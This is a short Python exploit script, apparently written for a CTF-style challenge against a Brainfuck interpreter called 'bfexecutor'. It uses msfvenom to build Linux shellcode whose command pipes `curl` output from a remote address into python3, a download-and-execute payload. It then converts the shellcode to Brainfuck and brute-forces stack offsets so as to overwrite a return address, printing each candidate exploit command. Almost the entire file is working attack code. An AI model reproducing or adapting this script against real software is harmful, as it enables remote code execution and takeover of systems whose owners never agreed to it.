from subprocess import check_output

import bh_translator

TRANSLATOR_PATH = "./translator"
PLATFORM = "linux/x64/exec"
ARCHITECTURE = "x64"
COMMAND = 'curl "http://0.0.0.0:6789/1.sc" | python3'


def gen_shellcode(cmd):  # requires msfvenom (metasploit framework)
    return check_output(
        'msfvenom --format raw --platform linux -p {} -a {} CMD="{}"'.format(
            PLATFORM, ARCHITECTURE, cmd
        ),
        shell=True
    )


SHELLCODE = gen_shellcode(COMMAND)
TRANSLATED_SHELLCODE = bh_translator.translate(SHELLCODE)

STRT_ADDRESS = "0000004783e8"  # return address of function #1 in backtrace
FNSH_ADDRESS = "7fffdeadb000"  # desired return address


def main():
    max_position = 2000
    a = list(reversed([STRT_ADDRESS[i * 2:i * 2 + 2] for i in range(len(STRT_ADDRESS) // 2)]))
    b = list(reversed([FNSH_ADDRESS[i * 2:i * 2 + 2] for i in range(len(STRT_ADDRESS) // 2)]))

    # position is an offset of rsp by the variable 'cells'
    for position in range(1000, max_position):
    # for position in [1131]:
        s = ['>' * position] + [((int(a[i], 16) - int(b[i], 16) + 256) % 256) * '-' + '>' for i in range(len(a))]
        res = TRANSLATED_SHELLCODE + ''.join(s)
        print(('echo "" | ./bfexecutor "{}"'.format(res)))
        print('position:', position)
        # check exploitations here, break


if __name__ == '__main__':
    main()
